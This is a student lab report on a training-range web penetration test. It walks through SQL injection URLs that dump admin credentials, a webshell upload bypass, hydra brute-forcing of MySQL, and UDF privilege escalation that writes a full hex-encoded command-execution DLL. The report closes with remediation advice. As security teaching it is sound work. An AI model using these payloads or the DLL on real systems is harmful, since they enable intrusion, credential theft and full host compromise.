# <center>《Web渗透测试》实验报告</center>

<center>组号：5</center>

<center>姓名：侯博文 陆皓喆 郝志成 秦德龙 胡博浩</center>

<center>学号：2212260 2211044 2212514 2211462 2212998</center>

<center>专业：信息安全、信息安全-法学双学位班</center>


<center>完成时间：2024年7月12日</center>



# 一、实验目的

通过本实验，掌握web渗透测试技巧，对所学习的nmap扫描技术、sql注入、主机漏洞等对目标进行信息收集及漏洞分析，需要找到flag，并对实验过程截图。

注意：flag可能在数据库或者靶机某个用户桌面等地方。思路通过web漏洞找找数据库，并找到后台登录，找文件上传漏洞getshell，找系统漏洞提权等。



# 二、小组分工

|  组员  |                             分工                             |                    详细描述所做工作和贡献                    |
| :----: | :----------------------------------------------------------: | :----------------------------------------------------------: |
| 侯博文 |                       写shell，UDF提权                       | 作为组长，带领队伍完成了渗透的分析，明确了测试的目标和存在的漏洞。进行了实验报告的编写，完成了提权操作，对于连接数据库给出了远程连接的方法，对于寻找密码给出了爆破求解的方法，对于权限提升修复给出了自己的见解。 |
| 陆皓喆 |          确定SQL注入点、判断注入类型、开始执行注入           | 完成了SQL注入的部分，根据队友的主机扫描结果去分析对应的注入点，并通过课上讲述的方法成功完成数据库信息的获取。进行了实验报告的编写，对于数据解密、SQL注入修复部分提出了自己的见解。 |
| 郝志成 | 主机扫描、猜测后台登录界面、浏览后台界面、寻找信息泄漏点、寻找文件上传漏洞、文件上传漏洞利用 | 和秦德龙互相配合，在得到解密后的密码后进行后台登录，发现了存在文件上传漏洞并且成功上传一句话木马，为后续的提权工作打下了基础。进行了实验报告的编写，对于文件上传修复提出了自己的见解。 |
| 秦德龙 | 主机扫描、猜测后台登录界面、浏览后台界面、寻找信息泄漏点、寻找文件上传漏洞、文件上传漏洞利用 | 和郝志成互相配合，完成了后台信息的搜集与分析，通过更改路径规避检查，构造出一句话木马，使用蚁剑链接，为后续提权操作打下基础。进行了实验报告的编写，对于文件上传修复提出了自己的见解。 |
| 胡博浩 |  利用漏洞点寻找密码、连接数据库、寻找数据库中存在的敏感信息  | 利用后台的数据库中内容得到对应MD5码，再进行相应解密获得数据库密码；进一步通过navicat连接数据库，通过搜集信息，找到了在数据库中的敏感信息。进行了实验报告的编写，对于弱密码加强部分提出了自己的见解。 |



# 三、实验内容

某公司的官方网站，现在需要进行上线前的渗透测试，发现问题并提出整改建议。视发现的漏洞以及修复建议是否合理得分。（注意：该系统在内网192.168.188.0/24，配置网络以及恢复win7服务器快照到attack状态，再进行测试。）

![1](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\1.PNG)



# 四、实验步骤

## 4.1 主机发现

### 4.1.1 修改ip地址和恢复快照模式

首先根据文档提示，将win7和kali的ip地址均修改为192.168.188.0字段。

win7：

![2](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\2.PNG)

kali：

![3](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\3.PNG)

然后我们恢复kali的快照模式

![4](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\4.png)



### 4.1.2 利用Nmap扫描ip地址

利用Nmap语句，编写`nmap -sV 192.168.188.0/24`

![5](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\5.png)



### 4.1.3 根据扫描结果收集端口信息

我们根据扫描结果，发现192.168.188.150存在可疑开放端口，所以我们进一步扫描192.168.188.150

![6](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\6.png)

我们发现80端口提供http服务，3306端口提供数据库服务，根据实验目的部分的提示，自然想到对这两个端口进行检测。



## 4.2 SQL注入

### 4.2.1 确定SQL注入点

首先我们根据ip地址，尝试访问对应的网站。

![7](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\7.png)

访问成功

猜想该部分存在SQL注入漏洞，我们对网页的各界面进行排查

首先访问产品中心页面（product），输入`http://192.168.188.150/index.php?s=/product/6`，发现可以进行访问

![8](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\8.png)

我们进行单引号报错测试，输入`http://192.168.188.150/index.php?s=/product/6'`

![9](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\9.png)

发现并没有报错

我们继续测试下一个页面新闻动态（news）

输入`http://192.168.188.150/index.php?s=/news/6`

![10](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\10.png)

发现可以正常访问

我们再通过单引号报错测试，输入`http://192.168.188.150/index.php?s=/news/6'`

![11](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\11.png)

发现报错，说明news界面存在SQL注入漏洞



### 4.2.2 判断注入类型

我们需要知道该注入是字符型注入还是数字型注入，我们通过在URL后加上and 1=2--进行测试

![12](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\12.png)

发现成功执行了，说明后面and 1=2没有执行，说明该注入是字符型注入



### 4.2.3 开始执行注入

#### 4.2.3.1 查询列

首先使用`http://192.168.188.150/index.php?s=/news/6``) order by 7--`查询7列，没有报错，说明至少有7列

![13](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\13.png)

然后`http://192.168.188.150/index.php?s=/news/6``)`` order by 8--`查询8列，发现报错了，说明一共存在7列

![14](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\14.png)



#### 4.2.3.2 获取数据库名

知道了数据库的列，先查看列数显示位置。由于字段数为7,尝试union联合查询`http://192.168.188.150/index.php``?s=/news/-6) union select 1,2,3,4,5,6,7--`

![15](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\15.png)

说明回显位为2和7。

然后查询数据库名称`http://192.168.188.150/index.php``?s=/news/-6) union select 1,database(),3,4,5,6,7--`

![16](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\16.png)

说明数据库名为tpx



#### 4.2.3.3 获取数据库表名

查询tpx数据库里的表：`http://192.168.188.150/index.php``?s=/news/-6) union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()--`

![17](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\17.png)

得到数据库表名：

- tpx_admin_access
- tpx_admin_node
- tpx_admin_role
- tpx_admin_role_user
- tpx_admin_user
- tpx_cms_news
- tpx_cms_partner
- tpx_cms_product
- tpx_cms_product_cat
- tpx_cms_single_page
- tpx_cms_slide
- tpx_cms_tag_pool
- tpx_config
- tpx_data_file

通过观察可得，tpx_admin_user比较可疑，我们进一步查询该表中的字段



#### 4.2.3.4 获取数据库字段名

查询表tpx_admin_user中的字段名`http://192.168.188.150/index.php``?s=/news/-6) union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='tpx_admin_user'--`

![18](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\18.png)

查询到字段id,username,password,password_salt,reg_time,reg_ip,last_login_time,last_login_ip,last_change_pwd_time,status

发现username和password比较可疑，进一步获取其数据



#### 4.2.3.5 获取数据库数据

根据得到的username和password字段，尝试获取tpx_admin_user表里的数据，并在中间添加分隔符0x3d。`http://192.168.188.150/index.php``?s=/news/-6) union select 1,2,3,4,5,6,group_concat(username,0x3d,password) from tpx_admin_user--`

![19](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\19.png)

得到对应内容： 

- admin=WW14MVpXUnZiakV5TXc9PQ==
- admin2=e10adc3949ba59abbe56e057f20f883e
- admin3=TVRJek5EVTJabmxRWldoS2NFZHhkZz09

我们发现admin的密码比较可疑



#### 4.2.3.6 对数据进行解密

观察到密码最后出现了两个等号，说明该密码为base64加密

![20](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\20.png)

我们通过两次base64解密得到最后的密码：bluedon123

我们再对第三行数据进行解密，通过两次base64解密，得到对应密码

![21](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\21.png)

**综上所述，我们得到两组登陆的账号与密码：**

- **用户名为admin，用户密码为bluedon123**
- **用户名为admin3，用户密码为123456fyPehJpGqv**



## 4.3 登陆网站后台

### 4.3.1 猜测后台登陆界面

猜测login可以登录后台，可跳转到`http://192.168.188.150/admin.php?s=/login/index`界面，利用上一小节破解出的用户名，密码可以登录网站后台。

![22](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\22.png)



### 4.3.2 浏览后台界面

可以搜索各种敏感信息和存在漏洞，可以发现存在SQL查询界面，查询各种表的信息。

![23](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\23.png)

此外，浏览数据库可以发现可以上传文件的地方，以此猜测存在文件上传漏洞。

![24](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\24.png)



### 4.3.3 利用后台权限进一步获取信息

利用后台的数据库操作界面可以获得丰富的信息

![25](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\25.png)

如上图，我们可以找到其中的一个flag，这个flag在后面连接上数据库后也再一次找到。

![26](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\26.png)

此处还查取了数据库用户的信息，在4.4.1.2中对其解密，获得密码链接数据库。



### 4.3.4 利用文件上传漏洞提权

在后台页面可以发现有文件上传漏洞。

![27](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\27.png)

尝试提交一句话木马

![28](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\28.png)

发现只允许提交.png等后缀的文件，更改路径规避检查：

![29](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\29.png)

发现上传成功，使用蚁剑链接

![30](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\30.png)

后续继续提权



## 4.4 进入数据库

### 4.4.1 寻找密码

#### 4.4.1.1 爆破求解

使用hydra爆破mysql密码

```
hydra -L ./user.txt -P ./pass.txt -t 2 -e n -f -v 192.168.11.130 mysql
```

![31](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\31.png)

得到用户名和密码：root/123456



#### 4.4.1.2 使用md5码解密

或者也可以对在4.3.2中发现的md5密文进行解密：

![32](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\32.png)

发现密码123456



### 4.4.2 连接数据库

#### 4.4.2.1 远程连接mysql

```
mysql -u root -p123456 -h[ip]
```

![33](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\33.png)

发现flag数据库名

![34](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\34.png)

找到数据库中的flag1

```
flag{27th_bdctf_afgs_gkakf}
```

![36](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\36.png)

找到数据库flag2

```
flag{BD_27_TH_sqli_flag_kgesfa}
```



#### 4.4.2.2 navicat连接mysql

同理 navicat 也可以连接

![37](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\37.png)

flag1

![38](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\38.png)

flag2

![39](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\39.png)



### 4.4.3 写shell

查看MySQL写入权限`show global variables like '%secure_file_priv%';`

![40](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\40.png)

表示可以进行写入

![41](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\41.png)

蚁剑连接成功

![42](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\42.png)



### 4.4.4 udf提权

查看安装目录

```SQL
show variables like '%plugin%';
```

![43](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\43.png)

写入dll

```sql
SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.5\\lib\\plugin\\udf.dll';
```

![44](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\44.png)

执行成功

创建函数sys_eval

![45](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\45.png)

whoami直接是system用户

dir桌面发现flag3

![46](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\46.png)

拿到flag

![47](E:\学学学\本科\大三上\实习实训\WEB渗透测试\第五小组.assets\47.png)

gbk乱码，转为utf8为`恭喜您闯关成功!`



## 4.5 flag

我们总共获得了三个flag：

其中在数据库中，我们获得了flag1和flag2

flag1：flag{27th_bdctf_afgs_gkakf}

flag2：flag{BD_27_TH_sqli_flag_kgesfa}

通过提权，我们在桌面找到了flag3

flag3：`恭喜您闯关成功!`



# 五、修复建议

## 5.1 SQL注入修复

### 5.1.1 使用参数化查询并且对输入验证和过滤

参数化查询（Parameterized Queries）是防止SQL注入的有效方法。它通过将SQL语句和用户输入分开处理，避免了将用户输入直接嵌入SQL语句中的风险。可以在用户输入后，对输入的字符以及范围进行检查，以此防止sql注入攻击。



### 5.1.2 使用ORM框架的详细讲解

ORM是一种将对象编程语言中的对象与关系数据库中的数据表进行映射的技术。ORM框架使得开发者可以通过操作对象来处理数据库，而不需要编写复杂的SQL语句。其工作原理为：

- 定义类来表示数据库中的表。每个类的实例对应表中的一行记录，每个类的属性对应表中的一列。
- ORM框架将对象操作转换为SQL查询，并执行这些查询。
- ORM框架内置了参数化查询，自动处理用户输入，防止SQL注入攻击。



## 5.2 弱密码加强

使用多种字符组合的强密码，如大小写字母+数字+特殊字符；

用户密码中不要出现与用户名或者系统名相关的字符，如用户名@123、系统名123等；

不要使用系统默认初始密码；或设定在系统首次登录时，强制修改系统默认初始密码；

应避免部门或单位对成员设置相同密码；

对系统中密码的存储进行加密处理，避免密码明文存储；

增强用户安全意识，定期变更系统密码；

应避免同一密码用于多个系统，避免由于信息泄露导致的安全风险连锁反应；



## 5.3 文件上传修复

### 5.3.1 前端检查

在前端进行文件上传的初步检查可以减少不必要的服务器请求，提升用户体验。可以通过HTML5的`accept`属性或JavaScript代码检查文件类型是否符合要求，例如只允许图片或PDF文件。或者使用JavaScript代码在用户选择文件时即时检查文件大小，确保其不超过设定的最大限制，例如2MB。



### 5.3.2 后端检查

后端检查主要分为白名单和黑名单，白名单是一种只允许指定类型和大小的文件通过的策略。黑名单策略是阻止特定类型或内容的文件上传。

白名单常见的策略为：

- 只允许特定类型的文件（如图片、PDF等）通过，检查上传文件的MIME类型和扩展名。
- 限制上传文件的大小，确保不会超过设定的最大限制，例如2MB。
- 对文件名进行过滤和规范化处理，防止恶意文件通过特制文件名进行攻击。
- 将上传的文件存储在非Web可访问的目录中，防止直接通过URL访问上传文件，或者随机化文本文件的名称，使攻击者无法找到文件。

黑名单常见的策略为：

- 禁止上传 .asp .jsp .php .exe .sh .bat等可执行文件。
- 对文件内容进行扫描，检测并阻止包含恶意代码的文件上传。（扫描文件特征，以防止仅仅改变了扩展名，但是文件类型并没有改变）
- 此外也应该记录所有文件上传操作，包括文件名、文件类型、上传时间等，以便后续审计和安全分析。



## 5.4 权限提升

针对权限提升漏洞，可以采取以下措施：

- mysql配置文件中`secure_file_priv`项设置为 NULL 或 非mysql/lib/plugin目录。
- 数据库用户确保正确实施最小权限原则。
- 定期更新操作系统、应用程序和所有相关软件，及时应用安全补丁。这有助于修复已知的安全漏洞，防止攻击者利用这些漏洞进行权限提升。建议配置自动更新或建立严格的补丁管理流程。



# 六、个人心得

在这次实验中，我们小组对Web渗透测试进行了全面的实践，并取得了显著的成果。从最初的主机发现到最终的权限提升，每一步都让我们对网络安全的各个方面有了更深入的理解和认识。通过这次实验，我们不仅掌握了多种渗透测试技巧，还在团队协作和解决问题的过程中得到了宝贵的经验。

在实验过程中，我们遇到了不少挑战。首先是主机发现阶段，由于网络配置复杂，需要我们不断尝试和调整，但是最终还是成功找到了关键的开放端口。在SQL注入阶段，我们对多个页面进行了细致的测试，最终发现了SQL注入点，并通过注入语句成功获取了数据库中用户名和密码，以此登录和连接数据库，获得了2个关键flag。在文件上传漏洞的利用中，我们深入分析了上传机制，通过精心构造的恶意文件，成功突破了服务器的限制，获取了shell权限。最后的权限提升阶段，通过对系统漏洞和配置的深入研究，我们成功提升了权限，全面掌控了目标系统，得到了最后一个flag。

每一次挑战都是一次学习和成长的机会。通过不断的尝试和探索，我们不仅掌握了渗透测试的各种技巧，更重要的是，学会了如何在团队合作中发挥每个人的优势，共同解决问题。

